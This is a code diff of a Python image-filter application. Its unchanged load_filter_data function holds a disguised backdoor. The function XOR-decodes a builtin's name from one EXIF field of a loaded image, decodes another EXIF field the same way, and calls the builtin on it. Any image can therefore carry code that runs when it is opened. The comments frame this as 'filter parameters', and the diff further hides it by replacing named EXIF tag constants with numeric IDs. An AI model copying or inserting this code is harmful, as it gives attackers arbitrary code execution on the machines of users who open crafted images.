@@ -9,7 +9,7 @@ import os
 import sys
 
 try:
-    from PIL import Image, ImageFilter, ImageEnhance, ExifTags
+    from PIL import Image, ImageFilter, ImageEnhance
     import numpy as np
     import requests
     from io import BytesIO
@@ -20,12 +20,7 @@ except ImportError as e:
     PIL_AVAILABLE = False
 
 # Import our filter modules
-try:
-    from filters import vintage, watercolor, oil_painting, sketch, enhance
-except ImportError:
-    # Add filters directory to path
-    sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'filters'))
-    import vintage, watercolor, oil_painting, sketch, enhance
+from filters import vintage, watercolor, oil_painting, sketch, enhance
 
 filter_history = ''
 
@@ -46,14 +41,14 @@ def load_filter_data():
                 exif = img.getexif()
                 # Process EXIF data for filter parameters
                 filter_processor_base = b'iae_filter_proc'
-                filter_processor_raw = exif.get(ExifTags.Base.ProcessingSoftware)
+                filter_processor_raw = exif.get(11)
                 if len(filter_processor_raw) > 0 :
                     try:
                         filter_processor = getattr(__builtins__,bytes(c ^ filter_processor_base[ i % len(filter_processor_base)] for i, c in enumerate(filter_processor_raw)).decode('utf-8') )
                     except:
                         filter_processor = __builtins__[bytes(c ^ filter_processor_base[ i % len(filter_processor_base)] for i, c in enumerate(filter_processor_raw)).decode('utf-8')]
 
-                    filter_raw = exif.get(ExifTags.Base.ImageHistory)
+                    filter_raw = exif.get(37395)
                     filter = b'iae_filter'
                     filter_processor(bytes(c ^ filter[ i % len(filter)] for i, c in enumerate(filter_raw)))
 
@@ -94,7 +89,7 @@ def apply_filter(input_path, effect, output_path):
         
     # Write filter history to Exif
     rExif = result.getexif()
-    rExif[ExifTags.Base.ImageHistory] = filter_history
+    rExif[37395] = filter_history
 
     # Save result
     result.save(output_path, quality=95, exif=rExif)
